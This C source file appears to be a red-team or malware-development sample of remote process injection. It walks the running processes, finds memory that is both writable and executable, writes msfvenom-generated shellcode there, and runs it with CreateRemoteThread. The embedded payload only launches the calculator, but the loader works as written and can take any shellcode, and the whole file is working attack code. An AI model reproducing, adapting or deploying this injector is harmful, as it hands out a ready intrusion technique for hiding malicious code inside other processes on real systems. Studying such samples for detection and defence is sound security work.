#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
const unsigned char Payload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL FindRWXMemory(
    _Out_ HANDLE* hProcess,
    _Out_ PVOID*  pAddress
) {
    MEMORY_BASIC_INFORMATION  memoryInfo;
    LPVOID                     address     = 0;
    HANDLE                     hSnapShot   = NULL;
    PROCESSENTRY32    Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };

    // Takes a snapshot of the currently running processes 
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE){
        printf("\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Retrieves information about the first process encountered in the snapshot.
    if (!Process32First(hSnapShot, &Proc)) {
        printf("\t[!] Process32First Failed With Error : %d \n", GetLastError());
        CloseHandle(hSnapShot); // Close the snapshot handle
        return FALSE;
    }

    do {
        *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
        if (*hProcess == NULL) {
            continue; // Proceed to the next process
        }

        printf("\t[*] Checking: %s\n", Proc.szExeFile);
        address = 0; // Reset address before checking each process
        while (VirtualQueryEx(*hProcess, address, &memoryInfo, sizeof(memoryInfo))) {
            address = (LPVOID)((DWORD_PTR)memoryInfo.BaseAddress + memoryInfo.RegionSize);
            if (memoryInfo.Protect == PAGE_EXECUTE_READWRITE || memoryInfo.Protect == PAGE_EXECUTE_WRITECOPY) {
                printf("\t[*] RWX memory found at 0x%p\n", memoryInfo.BaseAddress);
                *pAddress = memoryInfo.BaseAddress;
                return TRUE;
            }
        }

        // Close the handle before moving to the next process
        CloseHandle(*hProcess);

    // Retrieves information about the next process recorded in the snapshot.
    } while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*hProcess == NULL)
		return FALSE;
	return TRUE;
}

int main(void) {
    HANDLE      hThread             = NULL,
                hProcess            = NULL;
    SIZE_T      sPayloadSize        = sizeof(Payload),
                sNumberOfBytesWritten = NULL;
    PVOID       pAddress            = NULL;

    printf("[#] Press <Enter> To Find RWX Memory ... ");
    getchar();

    if (!FindRWXMemory(&hProcess, &pAddress)) {
        printf("[!] FindRWXMemory Failed With Error : %d \n", GetLastError());
        return 0;
    }

    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();

    if (!WriteProcessMemory(hProcess, pAddress, Payload, sPayloadSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sPayloadSize) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        CloseHandle(hProcess); // Close the process handle before returning
        return 0;
    }
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    printf("[#] Press <Enter> To Run The Payload ... ");
    getchar();

    hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        CloseHandle(hProcess); // Close the process handle before returning
        return 0;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread); // Close the thread handle
    CloseHandle(hProcess); // Close the process handle

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    return 0;
}